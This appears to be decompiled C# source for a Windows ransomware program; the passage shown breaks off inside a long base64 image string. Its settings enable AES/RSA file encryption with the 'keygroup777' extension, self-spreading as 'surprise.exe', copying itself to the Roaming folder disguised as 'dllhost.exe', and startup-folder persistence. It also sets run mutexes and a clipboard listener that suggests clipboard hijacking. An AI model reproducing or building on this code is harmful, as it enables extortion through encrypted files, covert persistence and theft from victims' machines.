using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "keygroup777";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "dllhost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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